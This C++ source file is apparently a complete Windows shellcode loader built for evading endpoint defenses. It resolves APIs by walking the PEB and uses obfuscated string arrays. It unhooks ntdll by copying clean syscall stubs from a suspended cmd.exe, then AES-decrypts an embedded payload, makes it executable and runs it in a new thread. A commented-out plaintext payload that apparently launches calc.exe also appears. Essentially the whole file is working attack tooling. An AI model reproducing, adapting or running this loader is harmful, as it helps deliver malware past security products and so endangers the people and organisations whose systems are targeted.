#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <psapi.h>
#include <string>
#include<iostream>
#pragma comment (lib, "advapi32")
#include <malloc.h>
//Took some Code From @Sector7
//0xbugatti

struct PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
};
struct PEB
{
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	union
	{
		BOOLEAN BitField;
		struct
		{
			BOOLEAN ImageUsesLargePages : 1;
			BOOLEAN IsProtectedProcess : 1;
			BOOLEAN IsImageDynamicallyRelocated : 1;
			BOOLEAN SkipPatchingUser32Forwarders : 1;
			BOOLEAN IsPackagedProcess : 1;
			BOOLEAN IsAppContainer : 1;
			BOOLEAN IsProtectedProcessLight : 1;
			BOOLEAN SpareBits : 1;
		};
	};
	HANDLE Mutant;
	PVOID ImageBaseAddress;
	PEB_LDR_DATA* Ldr;
	//...
};
struct UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWCH Buffer;
};
struct LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	union
	{
		LIST_ENTRY InInitializationOrderLinks;
		LIST_ENTRY InProgressLinks;
	};
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	//...
};

//DynamicSearch Functions Prepeare




//Implement Coustom GetModuleHandle and GetProcAddress
HMODULE WINAPI hlpGetModuleHandle(LPCWSTR sModuleName) {

	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB* ProcEnvBlk = (PEB*)__readfsdword(0x30);
#else
	PEB* ProcEnvBlk = (PEB*)__readgsqword(0x60);
#endif

	// return base address of a calling module
	if (sModuleName == NULL)
		return (HMODULE)(ProcEnvBlk->ImageBaseAddress);

	PEB_LDR_DATA* Ldr = ProcEnvBlk->Ldr;
	LIST_ENTRY* ModuleList = NULL;

	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;

	for (LIST_ENTRY* pListEntry = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
		pListEntry != ModuleList;	    	// walk all list entries
		pListEntry = pListEntry->Flink) {

		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		// check if module is found and return its base address
		
		if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)sModuleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}

	// otherwise:
	return NULL;

}
FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char* sProcName) {

	char* pBaseAddr = (char*)hMod;

	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);

	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

	// function address we're looking for
	void* pProcAddr = NULL;

	// resolve function by ordinal
	if (((DWORD_PTR)sProcName >> 16) == 0) {
		WORD ordinal = (WORD)sProcName & 0xFFFF;	// convert to WORD
		DWORD Base = pExportDirAddr->Base;			// first ordinal number

		// check if ordinal is not out of scope
		if (ordinal < Base || ordinal >= Base + pExportDirAddr->NumberOfFunctions)
			return NULL;

		// get the function virtual address = RVA + BaseAddr
		pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[ordinal - Base]);
	}
	// resolve function by name
	else {
		// parse through table of function names
		for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
			char* sTmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

			if (strcmp(sProcName, sTmpFuncName) == 0) {
				// found, get the function virtual address = RVA + BaseAddr
				pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
				break;
			}
		}
	}

	return (FARPROC)pProcAddr;
}




//Prepare Function Defination
typedef DWORD(WINAPI* WaitForSingleObject_t)(HANDLE hHandle,DWORD  dwMilliseconds);
typedef BOOL(WINAPI* CloseHandle_t)(HANDLE hObject);
typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID,SIZE_T,DWORD,DWORD);
typedef void(WINAPI* RtlMoveMemory_t)(void UNALIGNED *, void UNALIGNED * , SIZE_T);
typedef HANDLE(WINAPI* CreateThread_t)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID,DWORD,LPWORD);
typedef BOOL(WINAPI* VirtualFree_t)(__in LPVOID lpAddress,__in SIZE_T dwSize,__in DWORD dwFreeType);
typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL(WINAPI* ReadProcessMemory_t)(HANDLE hProcess,LPCVOID lpBaseAddress,LPVOID lpBuffer,SIZE_T nSize,SIZE_T* lpNumberOfBytesRead);
typedef BOOL(WINAPI* CreateProcessA_t)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
char sReadProcessMemory[] = { 'R', 'e', 'a', 'd', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
char sVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
char sWaitForSingleObject[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0x0 };
char sVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
char sVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
char sCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
char sRtlMoveMemory[] = { 'R', 't', 'l', 'M', 'o', 'v', 'e', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
char sCreateProcessA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x0 };


WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sWaitForSingleObject);
VirtualProtect_t pVirtualProtect = (VirtualProtect_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sVirtualProtect);
RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"),sRtlMoveMemory);
VirtualAlloc_t  pVirtualAlloc = (VirtualAlloc_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sVirtualAlloc);
CreateThread_t pCreateThread = (CreateThread_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sCreateThread);
VirtualFree_t pVirtualFree = (VirtualFree_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sVirtualFree);
ReadProcessMemory_t pReadProcessMemory = (ReadProcessMemory_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sReadProcessMemory);
CreateProcessA_t pCreateProcessA=  (CreateProcessA_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), sCreateProcessA);
int AESDecrypt(char* payload, unsigned int payload_length, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_length)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


//unsigned char payload[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
//0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
//0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
//0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
//0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
//0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
//0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
//0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
//0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
//0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
//0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
//0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
//0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
//0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
//0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
//0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
//0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
//0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
//0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
//0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
//0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
//0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
//0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
//0x63,0x2e,0x65,0x78,0x65,0x00 };

char key[] = { 0xf4, 0x4e, 0x24, 0xf7, 0xb0, 0xc, 0x76, 0x1b, 0x88, 0xb1, 0xe9, 0x76, 0xef, 0x52, 0x40, 0x45 };
unsigned char payload[] = { 0x75, 0xe1, 0xd0, 0x47, 0xf5, 0x2f, 0x26, 0xbc, 0x8a, 0x7e, 0xec, 0x5d, 0xd1, 0x59, 0xcc, 0xa1, 0x43, 0x36, 0x9c, 0xb8, 0xb3, 0xbc, 0x76, 0x6d, 0x19, 0x4d, 0xf9, 0x8a, 0x2, 0xdd, 0x3e, 0xf, 0x92, 0x91, 0xe9, 0x6e, 0x9f, 0xfa, 0x37, 0xaf, 0xaf, 0xfa, 0xfd, 0x3b, 0xb, 0xcc, 0xeb, 0xb, 0x56, 0x99, 0xd5, 0x1c, 0x33, 0x73, 0x1e, 0x2a, 0x2c, 0x6a, 0x7b, 0xe7, 0xd5, 0xf8, 0x5b, 0xa8, 0xdc, 0xa0, 0x96, 0xda, 0x61, 0x74, 0x0, 0x4a, 0x27, 0x28, 0x27, 0x99, 0x16, 0xba, 0x7f, 0xae, 0x8a, 0x23, 0x72, 0xbd, 0x23, 0x87, 0x6f, 0x43, 0x12, 0x29, 0xad, 0xe1, 0xf8, 0x1, 0x1f, 0x1c, 0xea, 0xfd, 0xa5, 0x93, 0xea, 0x9, 0x15, 0x7, 0x95, 0x66, 0x17, 0x68, 0xc8, 0xd6, 0xd8, 0xe8, 0xd3, 0x28, 0x10, 0x55, 0x44, 0xff, 0x91, 0x91, 0x4e, 0x3, 0x52, 0x5e, 0x21, 0x79, 0x7d, 0x16, 0xaf, 0x1f, 0x0, 0x38, 0x84, 0x77, 0xc2, 0x6d, 0x65, 0x25, 0x20, 0x21, 0x49, 0x76, 0xd2, 0x14, 0xd0, 0x45, 0x4e, 0x62, 0xd3, 0x77, 0xc8, 0xa3, 0xc4, 0xb5, 0x46, 0x3c, 0xbb, 0xf0, 0x71, 0xb9, 0x8a, 0xd3, 0x59, 0xd0, 0x5a, 0x15, 0xb, 0xbe, 0xf5, 0x9c, 0x7a, 0xe5, 0xea, 0x6a, 0x3, 0x24, 0x32, 0x9b, 0x6f, 0xf5, 0x5a, 0x8f, 0x18, 0xb6, 0x34, 0xd, 0xff, 0xbf, 0xd9, 0x3c, 0xbb, 0xf5, 0x2d, 0x35, 0x71, 0x68, 0x10, 0xe4, 0x4e, 0xd8, 0x72, 0x47, 0x19, 0xa4, 0x5e, 0x9a, 0xcc, 0xc2, 0xf7, 0xaa, 0x72, 0x5e, 0xe, 0xf1, 0x5e, 0xea, 0x70, 0xfc, 0xa4, 0xff, 0x79, 0x43, 0xf1, 0xe0, 0x6, 0x43, 0x62, 0xcd, 0xbc, 0xde, 0x80, 0xff, 0xe9, 0x6b, 0xc1, 0x3d, 0xda, 0x7f, 0xd7, 0x8a, 0x9, 0x1d, 0x41, 0xeb, 0xf5, 0xcf, 0xb, 0x8c, 0x98, 0x56, 0xf, 0x19, 0x58, 0xe7, 0x57, 0xfb, 0x27, 0x9c, 0x44, 0x32, 0xdb, 0x80, 0x7b, 0x2d, 0xb, 0xa1, 0x3e, 0x1, 0x14, 0x4, 0x27, 0x9, 0x67, 0xa, 0xf4, 0x22, 0x75, 0x2c, 0x71, 0xbf, 0x10, 0x3a, 0x26, 0xc1, 0x6f, 0x1, 0x55, 0x6d };
unsigned int payload_len = sizeof(payload);

int FindFirstSyscall(char* pMem, DWORD size) {

	// gets the first byte of first syscall
	DWORD i = 0;
	DWORD offset = 0;
	BYTE pattern1[] = "\x0f\x05\xc3";  // syscall ; ret
	BYTE pattern2[] = "\xcc\xcc\xcc";  // int3 * 3

	// find first occurance of syscall+ret instructions
	for (i = 0; i < size - 3; i++) {
		if (!memcmp(pMem + i, pattern1, 3)) {
			offset = i;
			break;
		}
	}

	// now find the beginning of the syscall
	for (i = 3; i < 50; i++) {
		if (!memcmp(pMem + offset - i, pattern2, 3)) {
			offset = offset - i + 3;
			printf("First syscall found at 0x%p\n", pMem + offset);
			break;
		}
	}

	return offset;
}
int FindLastSysCall(char* pMem, DWORD size) {

	// returns the last byte of the last syscall
	DWORD i;
	DWORD offset = 0;
	BYTE pattern[] = "\x0f\x05\xc3\xcd\x2e\xc3\xcc\xcc\xcc";  // syscall ; ret ; int 2e ; ret ; int3 * 3

	// backwards lookup
	for (i = size - 9; i > 0; i--) {
		if (!memcmp(pMem + i, pattern, 9)) {
			offset = i + 6;
			printf("Last syscall byte found at 0x%p\n", pMem + offset);
			break;
		}
	}

	return offset;
}
static int UnhookNtdll(const HMODULE hNtdll, const LPVOID pCache) {
	
	/*
		UnhookNtdll() finds fresh "syscall table" of ntdll.dll from suspended process and copies over onto hooked one
	*/
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER)pCache;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR)pCache + pImgDOSHead->e_lfanew);
	int i;



	// find .text section
	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			pVirtualProtect((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				PAGE_EXECUTE_READWRITE,
				&oldprotect);
			if (!oldprotect) {
				// RWX failed!
				return -1;
			}

			// copy clean "syscall table" into ntdll memory
			DWORD SC_start = FindFirstSyscall((char*)pCache, pImgSectionHead->Misc.VirtualSize);
			DWORD SC_end = FindLastSysCall((char*)pCache, pImgSectionHead->Misc.VirtualSize);

			if (SC_start != 0 && SC_end != 0 && SC_start < SC_end) {
				DWORD SC_size = SC_end - SC_start;
				printf("dst (in ntdll): %p\n", ((DWORD_PTR)hNtdll + SC_start));
				printf("src (in cache): %p\n", ((DWORD_PTR)pCache + SC_start));
				printf("size: %i\n", SC_size);
				memcpy((LPVOID)((DWORD_PTR)hNtdll + SC_start),
					(LPVOID)((DWORD_PTR)pCache + +SC_start),
					SC_size);
			}

			// restore original protection settings of ntdll
			pVirtualProtect((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pImgSectionHead->VirtualAddress),
				pImgSectionHead->Misc.VirtualSize,
				oldprotect,
				&oldprotect);
			if (!oldprotect) {
				// it failed
				return -1;
			}
			return 0;
		}
	}

	// failed? .text not found!
	return -1;
}
int main(void) {
	int pid = 0;
	HANDLE hProc = NULL;
	int ret = 0;

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	BOOL success = pCreateProcessA(
		NULL,
		(LPSTR)"cmd.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
		//CREATE_NEW_CONSOLE,
		NULL,
		"C:\\Windows\\System32\\",
		&si,
		&pi);

	if (success == FALSE) {
		printf("[!] Error: Could not call CreateProcess\n");
		return 1;
	}

	// get the size of ntdll module in memory
	char* pNtdllAddr = (char*)hlpGetModuleHandle(L"ntdll.dll");
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pNtdllAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pNtdllAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;

	SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;

	// allocate local buffer to hold temporary copy of clean ntdll from remote process
	LPVOID pCache = pVirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);

	printf("ntdll size: %x | cache: %p\n", ntdll_size, pCache);

	SIZE_T bytesRead = 0;
	if (!pReadProcessMemory(pi.hProcess, pNtdllAddr, pCache, ntdll_size, &bytesRead))
	printf("Error reading: %d | %x\n", bytesRead, GetLastError());
	TerminateProcess(pi.hProcess, 0);
	printf("Unhooking ntdll\n");
	ret = UnhookNtdll(GetModuleHandleA((LPCSTR)sNtdll), pCache);
	Sleep(1000);
	pVirtualFree(pCache, 0, MEM_RELEASE);
	void* exec_mem = pVirtualAlloc(0, payload_len, 0x1000 | 0x2000, 0x04);
	printf("%-20s : 0x%-016p\n", "payload addr", (void*)payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)exec_mem);

	// Copy payload to new buffer
	AESDecrypt((char*)payload, payload_len, key, sizeof(key));
	printf("\Shellcode Decrypted\n");

	pRtlMoveMemory(exec_mem, payload, payload_len);

	printf("\nShellcode Moved To memory\n");
	// Make new buffer as executable
	DWORD oldprotect = 0;
	BOOL rv = pVirtualProtect(exec_mem, payload_len, 0x20, &oldprotect);
	if (rv) {
		printf("\nShellcode Injected Succefully!\n");
	}
	HANDLE th = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	pWaitForSingleObject(th, -1);
	return 0;













}

